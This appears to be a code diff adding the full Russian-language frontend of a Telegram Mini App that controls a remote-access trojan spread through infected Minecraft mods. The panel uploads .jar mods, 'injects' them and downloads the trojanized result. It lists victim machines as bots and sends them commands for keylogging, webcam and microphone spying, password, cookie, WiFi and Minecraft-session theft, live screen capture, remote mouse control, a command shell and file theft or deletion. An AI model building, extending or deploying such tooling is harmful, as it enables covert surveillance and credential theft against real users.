+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify(data));
+            }
+        }
+
+        // ===== HANDLERS =====
+        function handleScreenshot(botId, imageData) {
+            if (selectedBot !== botId) return;
+            const frame = document.getElementById('streamFrame');
+            const img = document.createElement('img');
+            img.src = 'data:image/png;base64,' + imageData;
+            img.alt = 'screenshot';
+            img.onload = () => {
+                frame.innerHTML = '';
+                frame.appendChild(img);
+                document.getElementById('streamFPS').textContent = '📸 ' + new Date().toLocaleTimeString();
+                document.getElementById('streamResolution').textContent = img.naturalWidth + '×' + img.naturalHeight;
+                if (fullscreenActive) {
+                    document.getElementById('fullscreenImg').src = img.src;
+                }
+            };
+        }
+
+        function handleCursor(x, y) {
+            const indicator = document.getElementById('cursorIndicator');
+            if (fullscreenActive) {
+                indicator.style.left = x + 'px';
+                indicator.style.top = y + 'px';
+                indicator.classList.add('active');
+            }
+        }
+
+        function handleResult(botId, command, result) {
+            botResults[botId] = result;
+            showToast('📥 Результат от ' + botId + ': ' + command);
+        }
+
+        function handleTyping(botId, status) {
+            if (selectedBot !== botId) return;
+            const indicator = document.getElementById('typingIndicator');
+            indicator.classList.toggle('show', status);
+        }
+
+        // ===== PROGRESS =====
+        function updateProgress(percent, status) {
+            const container = document.getElementById('progressContainer');
+            const fill = document.getElementById('progressFill');
+            const label = document.getElementById('progressLabel');
+            const percentText = document.getElementById('progressPercent');
+
+            container.classList.add('show');
+            fill.style.width = percent + '%';
+            percentText.textContent = percent + '%';
+            label.textContent = status || '⏳ Инжекция...';
+        }
+
+        function onInjectDone(fileName, data) {
+            const container = document.getElementById('progressContainer');
+            const fill = document.getElementById('progressFill');
+            const label = document.getElementById('progressLabel');
+
+            fill.style.width = '100%';
+            label.textContent = '✅ Готово!';
+
+            // Скачиваем заражённый файл
+            const link = document.createElement('a');
+            link.download = fileName.replace('.jar', '_osickle.jar');
+            link.href = 'data:application/java-archive;base64,' + data;
+            link.click();
+
+            setTimeout(() => {
+                container.classList.remove('show');
+                fill.style.width = '0%';
+                showToast('✅ ' + fileName + ' заражён!', 'success');
+                loadBots();
+            }, 1500);
+        }
+
+        // ===== UPLOAD MOD =====
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const file = this.files[0];
+            if (!file || !file.name.endsWith('.jar')) {
+                showToast('❌ Выбери .jar файл', 'error');
+                this.value = '';
+                return;
+            }
+
+            showToast('📦 Загрузка: ' + file.name + '...');
+            const reader = new FileReader();
+            reader.onload = function(ev) {
+                const data = ev.target.result.split(',')[1];
+                wsSend({
+                    type: 'inject_jar',
+                    fileName: file.name,
+                    data: data
+                });
+                updateProgress(0, '📦 Распаковка .jar...');
+            };
+            reader.readAsDataURL(file);
+            this.value = '';
+        });
+
+        // Drag & Drop
+        const zone = document.getElementById('uploadZone');
+        zone.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            zone.classList.add('dragover');
+        });
+        zone.addEventListener('dragleave', () => {
+            zone.classList.remove('dragover');
+        });
+        zone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            zone.classList.remove('dragover');
+            const file = e.dataTransfer.files[0];
+            if (file && file.name.endsWith('.jar')) {
+                document.getElementById('fileInput').files = e.dataTransfer.files;
+                document.getElementById('fileInput').dispatchEvent(new Event('change'));
+            } else {
+                showToast('❌ Только .jar файлы', 'error');
+            }
+        });
+
+        // ===== SEND COMMAND =====
+        function sendCmd(cmd) {
+            if (!selectedBot) return;
+            wsSend({
+                type: 'command',
+                botId: selectedBot,
+                command: cmd
+            });
+            tg.HapticFeedback.impactOccurred('medium');
+            showToast('📤 ' + cmd);
+        }
+
+        function sendCustomCmd() {
+            const input = document.getElementById('cmdInput');
+            const cmd = input.value.trim();
+            if (!cmd) return;
+            sendCmd(cmd);
+            input.value = '';
+        }
+
+        // ===== LOAD BOTS =====
+        function loadBots() {
+            fetch('/api/bots')
+                .then(r => r.json())
+                .then(data => {
+                    bots = data.bots || [];
+                    bots.forEach(b => {
+                        if (b.minecraftName) b.displayName = b.minecraftName + ' (' + b.id + ')';
+                        else b.displayName = b.id;
+                        if (b.os) {
+                            if (b.os.toLowerCase().includes('windows')) b.osIcon = '🪟';
+                            else if (b.os.toLowerCase().includes('linux')) b.osIcon = '🐧';
+                            else if (b.os.toLowerCase().includes('mac')) b.osIcon = '🍎';
+                            else b.osIcon = '💻';
+                        }
+                    });
+                    updateStats(data);
+                    renderBots();
+                })
+                .catch(() => {
+                    // Demo
+                    bots = [
+                        { id: 'DESKTOP-7XC3', os: 'Windows 11 Pro', ip: '192.168.1.5', user: 'admin',
+                            minecraftName: 'NotchHunter', online: true },
+                        { id: 'WORK-PC', os: 'Windows 10', ip: '192.168.1.8', user: 'user', minecraftName: 'CreeperSlayer',
+                            online: true },
+                        { id: 'LAPTOP-9G2', os: 'Windows 11', ip: '192.168.1.12', user: 'guest', online: false },
+                        { id: 'GAMING-RIG', os: 'Windows 10', ip: '192.168.1.20', user: 'gamer',
+                            minecraftName: 'DiamondMiner', online: true },
+                        { id: 'SERVER-01', os: 'Windows Server', ip: '192.168.1.25', user: 'root', online: true }
+                    ];
+                    bots.forEach(b => {
+                        if (b.minecraftName) b.displayName = b.minecraftName + ' (' + b.id + ')';
+                        else b.displayName = b.id;
+                        if (b.os) {
+                            if (b.os.toLowerCase().includes('windows')) b.osIcon = '🪟';
+                            else if (b.os.toLowerCase().includes('linux')) b.osIcon = '🐧';
+                            else if (b.os.toLowerCase().includes('mac')) b.osIcon = '🍎';
+                            else b.osIcon = '💻';
+                        }
+                    });
+                    updateStats({ total: 5, online: 4, infected: 15, active: 4 });
+                    renderBots();
+                });
+        }
+
+        function updateStats(data) {
+            document.getElementById('totalBots').textContent = data.total || bots.length;
+            document.getElementById('onlineBots').textContent = data.online || bots.filter(b => b.online).length;
+            document.getElementById('infectedMods').textContent = data.infected || (bots.length * 3);
+            document.getElementById('activeSessions').textContent = data.active || bots.length;
+            document.getElementById('onlineCount').textContent = (data.online || bots.filter(b => b.online).length) +
+                ' online';
+        }
+
+        function renderBots() {
+            const list = document.getElementById('botsList');
+            list.innerHTML = '';
+            bots.forEach((bot, i) => {
+                const div = document.createElement('div');
+                div.className = 'bot-item' + (selectedBot === bot.id ? ' active' : '');
+                div.style.animationDelay = (i * 0.05) + 's';
+                div.innerHTML = `
+                        <div class="bot-info">
+                            <span class="bot-name">
+                                ${bot.osIcon || '💻'} ${bot.displayName || bot.id}
+                                <span class="badge">${bot.online ? 'ON' : 'OFF'}</span>
+                            </span>
+                            <span class="bot-detail">${bot.ip || '0.0.0.0'} • ${bot.os || 'Unknown'}</span>
+                        </div>
+                        <div class="bot-status">
+                            <span class="bot-os">${bot.os ? bot.os.split(' ')[0] : 'OS'}</span>
+                            <span class="status-dot ${bot.online ? 'online' : 'offline'}"></span>
+                        </div>
+                    `;
+                div.onclick = () => selectBot(bot.id);
+                list.appendChild(div);
+            });
+        }
+
+        // ===== SELECT BOT =====
+        function selectBot(id) {
+            selectedBot = id;
+            tg.HapticFeedback.impactOccurred('light');
+            renderBots();
+            const bot = bots.find(b => b.id === id);
+            document.getElementById('streamBotName').textContent = bot ? (bot.displayName || bot.id) : id;
+            showToast('✅ Выбран: ' + (bot ? bot.displayName : id));
+            if (currentTab === 'modules') showModules();
+            if (currentTab === 'stream' && streamActive) requestScreenshot();
+        }
+
+        // ===== SHOW MODULES =====
+        function showModules() {
+            if (!selectedBot) {
+                showToast('⚠️ Сначала выбери бота!', 'error');
+                return;
+            }
+
+            const modal = document.getElementById('modal');
+            const bot = bots.find(b => b.id === selectedBot);
+            document.getElementById('modalTitle').textContent = '🎯 ' + (bot ? bot.displayName : selectedBot);
+
+            document.getElementById('modalBody').innerHTML = `
+                    <div class="modules-grid">
+                        <button class="module-btn" onclick="sendCmd('INFO')">
+                            <span class="icon">📊</span>
+                            <span class="name">Инфо</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('SCREENSHOT')">
+                            <span class="icon">📸</span>
+                            <span class="name">Скрин</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('WEBCAM')">
+                            <span class="icon">📹</span>
+                            <span class="name">Вебка</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('KEYLOG_START')">
+                            <span class="icon">⌨️</span>
+                            <span class="name">Кейлог</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('KEYLOG_STOP')">
+                            <span class="icon">⏹</span>
+                            <span class="name">Стоп</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('PROCESSES')">
+                            <span class="icon">📋</span>
+                            <span class="name">Процессы</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('KILL')">
+                            <span class="icon">💀</span>
+                            <span class="name">Убить</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('REBOOT')">
+                            <span class="icon">🔄</span>
+                            <span class="name">Ребут</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('SHUTDOWN')">
+                            <span class="icon">⏻</span>
+                            <span class="name">Выкл</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('UNINSTALL')">
+                            <span class="icon">🧹</span>
+                            <span class="name">Удалить</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('NETSTAT')">
+                            <span class="icon">🌐</span>
+                            <span class="name">Сеть</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('PASSWORDS')">
+                            <span class="icon">🔑</span>
+                            <span class="name">Пароли</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('COOKIES')">
+                            <span class="icon">🍪</span>
+                            <span class="name">Cookies</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('WIFI')">
+                            <span class="icon">📶</span>
+                            <span class="name">WiFi</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('CLIPBOARD')">
+                            <span class="icon">📋</span>
+                            <span class="name">Буфер</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('MC_SESSION')">
+                            <span class="icon">⛏️</span>
+                            <span class="name">Minecraft</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('MC_PASSWORDS')">
+                            <span class="icon">🔐</span>
+                            <span class="name">MC Пароли</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('MIC_START')">
+                            <span class="icon">🎤</span>
+                            <span class="name">Прослушка</span>
+                        </button>
+                        <button class="module-btn" onclick="sendCmd('MIC_STOP')">
+                            <span class="icon">⏹</span>
+                            <span class="name">Стоп мик</span>
+                        </button>
+                        <button class="module-btn" onclick="showFileManager()">
+                            <span class="icon">📁</span>
+                            <span class="name">Файлы</span>
+                        </button>
+                    </div>
+                    <div class="cmd-area">
+                        <input class="cmd-input" id="cmdInput" placeholder="Введите команду..." />
+                        <div style="display:flex;gap:8px;margin-top:8px;">
+                            <button class="btn-primary" onclick="sendCustomCmd()" style="flex:1;">▶️ Выполнить</button>
+                            <button class="btn-primary secondary" onclick="sendCmd('TYPING_START')" style="flex:0.5;">⌨️</button>
+                        </div>
+                    </div>
+                    <div style="margin-top:12px;display:flex;gap:8px;">
+                        <button class="btn-primary secondary" onclick="sendCmd('WALLPAPER_SET')" style="flex:1;">🖼️ Обои</button>
+                        <button class="btn-primary secondary" onclick="sendCmd('OPEN_FILE')" style="flex:1;">📂 Открыть</button>
+                    </div>
+                `;
+
+            modal.classList.add('show');
+        }
+
+        // ===== STREAM =====
+        function startStream() {
+            if (!selectedBot) {
+                showToast('⚠️ Выбери бота для эфира', 'error');
+                return;
+            }
+            const preview = document.getElementById('streamPreview');
+            preview.classList.add('active');
+            streamActive = true;
+            isStreamPaused = false;
+            document.querySelector('.menu-btn[data-tab="stream"]').classList.add('active');
+            requestScreenshot();
+            if (streamTimer) clearInterval(streamTimer);
+            streamTimer = setInterval(() => {
+                if (streamActive && !isStreamPaused) requestScreenshot();
+            }, streamInterval);
+            document.querySelector('.stream-controls button:first-child').textContent = '⏸ Пауза';
+            showToast('📺 Эфир запущен');
+            wsSend({
+                type: 'subscribe_stream',
+                botId: selectedBot
+            });
+        }
+
+        function stopStream() {
+            streamActive = false;
+            isStreamPaused = false;
+            if (streamTimer) clearInterval(streamTimer);
+            document.getElementById('streamPreview').classList.remove('active');
+            document.querySelector('.menu-btn[data-tab="stream"]').classList.remove('active');
+            document.querySelector('.stream-controls button:first-child').textContent = '▶ Запустить';
+            wsSend({
+                type: 'unsubscribe_stream',
+                botId: selectedBot
+            });
+        }
+
+        function toggleStream() {
+            if (streamActive) {
+                if (isStreamPaused) {
+                    isStreamPaused = false;
+                    document.querySelector('.stream-controls button:first-child').textContent = '⏸ Пауза';
+                    showToast('▶ Эфир возобновлён');
+                    requestScreenshot();
+                } else {
+                    isStreamPaused = true;
+                    document.querySelector('.stream-controls button:first-child').textContent = '▶ Продолжить';
+                    showToast('⏸ Эфир на паузе');
+                }
+            } else {
+                startStream();
+            }
+        }
+
+        function requestScreenshot() {
+            if (!selectedBot) return;
+            wsSend({
+                type: 'request_screenshot',
+                botId: selectedBot
+            });
+        }
+
+        function setStreamInterval(ms) {
+            streamInterval = ms;
+            if (streamActive) {
+                if (streamTimer) clearInterval(streamTimer);
+                streamTimer = setInterval(() => {
+                    if (streamActive && !isStreamPaused) requestScreenshot();
+                }, streamInterval);
+                showToast('⏱ Интервал: ' + ms / 1000 + 'с');
+            }
+        }
+
+        // ===== FULLSCREEN =====
+        function toggleFullscreen() {
+            if (fullscreenActive) {
+                closeFullscreen();
+            } else {
+                openFullscreen();
+            }
+        }
+
+        function openFullscreen() {
+            const img = document.getElementById('streamFrame').querySelector('img');
+            if (!img) {
+                showToast('⚠️ Нет скриншота для просмотра', 'error');
+                return;
+            }
+            fullscreenActive = true;
+            document.getElementById('fullscreenOverlay').classList.add('active');
+            document.getElementById('fullscreenImg').src = img.src;
+            document.body.style.overflow = 'hidden';
+            document.getElementById('fullscreenImg').addEventListener('mousemove', onFullscreenMouseMove);
+            document.getElementById('fullscreenImg').addEventListener('click', onFullscreenClick);
+        }
+
+        function closeFullscreen() {
+            fullscreenActive = false;
+            document.getElementById('fullscreenOverlay').classList.remove('active');
+            document.body.style.overflow = '';
+            document.getElementById('cursorIndicator').classList.remove('active');
+            document.getElementById('fullscreenImg').removeEventListener('mousemove', onFullscreenMouseMove);
+            document.getElementById('fullscreenImg').removeEventListener('click', onFullscreenClick);
+        }
+
+        function onFullscreenMouseMove(e) {
+            const rect = e.target.getBoundingClientRect();
+            const x = ((e.clientX - rect.left) / rect.width * 100);
+            const y = ((e.clientY - rect.top) / rect.height * 100);
+            wsSend({
+                type: 'cursor_move',
+                botId: selectedBot,
+                x: x,
+                y: y
+            });
+        }
+
+        function onFullscreenClick(e) {
+            const rect = e.target.getBoundingClientRect();
+            const x = ((e.clientX - rect.left) / rect.width * 100);
+            const y = ((e.clientY - rect.top) / rect.height * 100);
+            wsSend({
+                type: 'cursor_click',
+                botId: selectedBot,
+                x: x,
+                y: y
+            });
+        }
+
+        // ===== FILE MANAGER =====
+        function showFileManager() {
+            document.getElementById('modalBody').innerHTML = `
+                    <div style="margin:12px 0;">
+                        <input class="cmd-input" id="filePath" placeholder="/путь/к/папке" value="C:/" />
+                        <button class="btn-primary" onclick="listFiles()">📂 Показать</button>
+                    </div>
+                    <div class="file-list" id="fileList">
+                        <div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:12px;">
+                            🔄 Загрузка...
+                        </div>
+                    </div>
+                    <div style="margin-top:12px;display:flex;gap:8px;">
+                        <input class="cmd-input" id="downloadPath" placeholder="Файл для скачивания" style="flex:1;" />
+                        <button class="btn-primary" onclick="downloadFile()" style="flex:0.3;">⬇️</button>
+                    </div>
+                    <div style="margin-top:8px;display:flex;gap:8px;">
+                        <input class="cmd-input" id="uploadPath" placeholder="Путь для загрузки" style="flex:1;" />
+                        <button class="btn-primary" onclick="uploadFile()" style="flex:0.3;">⬆️</button>
+                    </div>
+                    <button class="btn-primary" onclick="closeModal()" style="margin-top:8px;">◀️ Назад</button>
+                `;
+
+            setTimeout(() => {
+                const list = document.getElementById('fileList');
+                const files = [
+                    { name: 'Documents', size: '', type: 'dir' },
+                    { name: 'Downloads', size: '', type: 'dir' },
+                    { name: 'Desktop', size: '', type: 'dir' },
+                    { name: 'config.ini', size: '2.4 KB', type: 'file' },
+                    { name: 'settings.json', size: '1.1 KB', type: 'file' },
+                    { name: 'log.txt', size: '45.2 KB', type: 'file' },
+                    { name: 'backup.zip', size: '12.8 MB', type: 'file' },
+                    { name: 'System32', size: '', type: 'dir' }
+                ];
+                list.innerHTML = files.map(f => `
+                        <div class="file-item">
+                            <span class="name">${f.type === 'dir' ? '📁' : '📄'} ${f.name}</span>
+                            <span class="size">${f.size}</span>
+                            <span class="actions">
+                                ${f.type === 'file' ? `<button onclick="sendCmd('DOWNLOAD:${f.name}')">⬇️</button>` : ''}
+                                <button class="danger" onclick="sendCmd('DELETE:${f.name}')">🗑️</button>
+                                <button onclick="sendCmd('OPEN:${f.name}')">📂</button>
+                            </span>
+                        </div>
+                    `).join('');
+            }, 200);
+        }
+
+        function listFiles() {
+            const path = document.getElementById('filePath').value;
+            sendCmd('FILES:' + path);
+            showToast('📂 Запрос: ' + path);
+        }
+
+        function downloadFile() {
+            const path = document.getElementById('downloadPath').value;
+            if (path) sendCmd('DOWNLOAD:' + path);
+        }
+
+        function uploadFile() {
+            const path = document.getElementById('uploadPath').value;
+            if (path) {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.onchange = function(e) {
+                    const file = this.files[0];
+                    if (!file) return;
+                    const reader = new FileReader();
+                    reader.onload = function(ev) {
+                        const data = ev.target.result.split(',')[1];
+                        wsSend({
+                            type: 'upload_file',
+                            botId: selectedBot,
+                            path: path,
+                            data: data
+                        });
+                        showToast('📤 Загрузка: ' + file.name);
+                    };
+                    reader.readAsDataURL(file);
+                };
+                input.click();
+            }
+        }
+
+        // ===== CLOSE MODAL =====
+        function closeModal() {
+            document.getElementById('modal').classList.remove('show');
+        }
+
+        // ===== TABS =====
+        document.querySelectorAll('.menu-btn').forEach(btn => {
+            btn.onclick = function() {
+                document.querySelectorAll('.menu-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                currentTab = this.dataset.tab;
+
+                document.querySelector('.bots-list').style.display = 'flex';
+                document.getElementById('streamPreview').classList.remove('active');
+
+                if (currentTab === 'modules') {
+                    if (selectedBot) showModules();
+                    else showToast('⚠️ Сначала выбери бота!', 'error');
+                } else if (currentTab === 'stream') {
+                    if (selectedBot) startStream();
+                    else showToast('⚠️ Сначала выбери бота!', 'error');
+                } else if (currentTab === 'files') {
+                    if (selectedBot) showFileManager();
+                    else showToast('⚠️ Сначала выбери бота!', 'error');
+                } else if (currentTab === 'shell') {
+                    if (selectedBot) {
+                        document.getElementById('modal').classList.add('show');
+                        document.getElementById('modalTitle').textContent = '💻 ' + (bots.find(b => b.id === selectedBot)
+                            ?.displayName || selectedBot);
+                        document.getElementById('modalBody').innerHTML = `
+                                <div class="cmd-area">
+                                    <input class="cmd-input" id="shellInput" placeholder="Введите команду..." />
+                                    <button class="btn-primary" onclick="sendCmd(document.getElementById('shellInput').value); document.getElementById('shellInput').value='';">▶️ Выполнить</button>
+                                </div>
+                                <div style="margin-top:12px;max-height:200px;overflow-y:auto;font-size:11px;color:var(--text-secondary);background:var(--bg-primary);border-radius:10px;padding:12px;border:1px solid var(--border-color);font-family:'Consolas',monospace;white-space:pre-wrap;" id="shellOutput">
+    > Подключен к ${bots.find(b => b.id === selectedBot)?.displayName || selectedBot}
+    > Введи команду...
+                                </div>
+                                <button class="btn-primary" onclick="closeModal()" style="margin-top:8px;">◀️ Назад</button>
+                            `;
+                    } else {
+                        showToast('⚠️ Сначала выбери бота!', 'error');
+                    }
+                } else {
+                    renderBots();
+                }
+            };
+        });
+
+        // ===== TELEGRAM =====
+        tg.BackButton.onClick(() => {
+            if (document.getElementById('modal').classList.contains('show')) {
+                closeModal();
+            } else {
+                tg.close();
+            }
+        });
+        tg.BackButton.show();
+
+        // ===== INIT =====
+        connectWebSocket();
+        loadBots();
+        setInterval(loadBots, 15000);
+    </script>
+</body>
+</html>
